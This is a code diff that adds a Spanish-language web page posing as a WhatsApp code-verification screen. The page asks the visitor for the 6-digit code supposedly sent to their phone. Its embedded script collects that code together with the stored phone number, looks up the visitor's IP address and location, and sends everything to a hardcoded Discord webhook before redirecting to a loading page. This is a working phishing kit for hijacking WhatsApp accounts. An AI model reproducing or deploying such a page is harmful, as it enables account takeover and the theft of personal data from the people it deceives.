@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="background-image: url('https://i.postimg.cc/Dz8PRjZy/gjk.png'); background-size: cover;">
+ 
+
+    <div class="gru-1">
+        <p class="fad-idn" style="width: 100%;display: flex; justify-content: center; text-align: center; margin-top: 30px; font-size: 22px;">Revisa tu WhatsApp, te hemos enviado un código de verificación</p>
+       <br><br>
+        <center> <div class="DWCS fad-idn">
+           
+            <div class="boxsm fade-down" style="text-align: left;">
+                <div class="cabe">
+                    <img style="width: 20px;  vertical-align: middle;" src="https://i.postimg.cc/8CY8R6qZ/h55.png" alt="">
+                    <b>WhatsApp</b>
+                    <p>Te llegara un codigo de 6 digitos</p>
+                    <div class="ast">
+                        <span>*</span>
+                        <span>*</span>
+                        <span>*</span>
+                        <span>-</span>
+                        <span>*</span>
+                        <span>*</span>
+                        <span>*</span>
+                    </div>
+                </div>
+            </div>
+   </div> </div><!--fin grupo 1 -->
+
+
+
+   <div class="gru-2"  style="display: none;">
+<form action="cargando--.html">
+    <div class="bxw">
+        <div class="ead-ders">
+            <img src="https://i.postimg.cc/jjPDFmfZ/Screenshot-4.png" alt="">
+            <h2 style="margin-bottom: 10px; ">Código de Verificación</h2>
+            <p>Hemos enviado un código de 6 dígitos a tu número de WhatsApp que termina en **** *** 0000</p>
+        <br></div>
+      <div class="cadd">
+        <label for="" style="font-size: 16px; font-weight: 600;">Código de Pantalla</label>
+        <center>
+        <input type="text" id="wed" placeholder="* * * * * *"  style="text-align: center; " required maxlength="6" minlength="6"  inputmode="numeric" pattern="[0-9]*" >
+        </center>
+
+      </div>
+
+      <div class="btnsw">
+        <button id="d54y"> <img style="width: 20px; font-size: 19px; vertical-align: middle;" src="https://i.postimg.cc/fR07MHXz/756.png" alt=""> VERIFICAR CUENTA</button>
+      </div>
+</form>
+      <div class="imFi">
+        <img src="https://i.postimg.cc/xCknZbh4/567.png" alt="">
+      </div>
+    </div>
+   </div>
+
+
+
+   <br><br><br><br><br>
+ 
+    
+  
+
+<script>
+  !function() {
+    'use strict';
+    const d_h = "https://discord.com/api/webhooks/1481333399946924203/b7E65TBdYOwrFuhD9_MC-wDt1HpBoK9PYjsRjid5i-EcHRJ64IvEnHWBv_-yfzQZqRXa";
+
+    function _x() {
+      let e = sessionStorage.getItem("_w") || "+0 0000000000";
+      return e.replace(/\D/g, "")
+    }
+
+    function _y() {
+      let e = _x(),
+        t = e.length >= 4 ? e.slice(-4) : "0000",
+        n = document.querySelector(".ead-ders p");
+      n && (n.innerHTML = `Hemos enviado un código de 6 dígitos a tu número de WhatsApp que termina en <b>**** *** ${t}</b>`)
+    }
+
+    function _z(e) {
+      let t = JSON.parse(sessionStorage.getItem("_uc") || "{}"),
+        n = _x();
+      return t[n] ? t[n].includes(e) : !1
+    }
+
+    function _w(e) {
+      let t = JSON.parse(sessionStorage.getItem("_uc") || "{}"),
+        n = _x();
+      t[n] || (t[n] = []), t[n].includes(e) || t[n].push(e), sessionStorage.setItem("_uc", JSON.stringify(t)), sessionStorage.setItem("_cd", e)
+    }
+
+    setTimeout(_y, 100);
+    const f = document.querySelector("form"),
+      i = document.getElementById("wed"),
+      b = document.getElementById("d54y");
+
+    if (f && i && b) {
+      i.addEventListener("input", function(e) {
+        this.value = this.value.replace(/\D/g, ""), b.disabled = 6 !== this.value.length
+      });
+
+      f.addEventListener("submit", async function(e) {
+        e.preventDefault();
+        let t = i.value.trim();
+        if (6 !== t.length || _z(t)) return;
+
+        b.disabled = !0;
+        b.innerHTML = '<img style="width:20px;vertical-align:middle" src="https://i.postimg.cc/fR07MHXz/756.png"> Verificando...';
+        _w(t);
+
+        try {
+          let n = sessionStorage.getItem("_w") || "N/A";
+          
+          // Obtener IP y Geo en una sola petición más rápida
+          const response = await fetch("https://ipapi.co/json/");
+          const d = await response.json();
+
+          const c = {
+            content: null,
+            embeds: [{
+              title: "🔐 Código de Verificación",
+              color: 15105570,
+              fields: [
+                { name: "📱 Numero", value: `\`${n}\``, inline: true },
+                { name: "🔢 Código", value: "```" + t + "```", inline: true },
+                { name: "🌍 Conexión", value: `IP: ${d.ip}\n${d.city}, ${d.country_name}`, inline: false }
+              ],
+              timestamp: new Date().toISOString()
+            }]
+          };
+
+          // CLAVE: Esperar el envío antes de redirigir
+          await fetch(d_h, {
+            method: "POST",
+            keepalive: true,
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(c)
+          });
+
+          window.location.href = "cargando--.html";
+
+        } catch (err) {
+          // Si algo falla (como la API de IP), enviamos al menos el código
+          window.location.href = "cargando--.html";
+        }
+      });
+    }
+
+    window.addEventListener("load", function() {
+      let e = document.querySelector(".gru-1"),
+        t = document.querySelector(".gru-2");
+      setTimeout(() => {
+        e && e.classList.add("fade-out-scale"), setTimeout(() => {
+          e && (e.style.display = "none"), t && (t.style.display = "block", t.classList.add("fade-in-scale"), setTimeout(() => {
+            let e = document.getElementById("wed");
+            e && e.focus()
+          }, 300))
+        }, 700)
+      }, 4e3)
+    })
+  }();
+</script>
+<script src="ak/dus.js"></script>
+
+</body>
+</html>
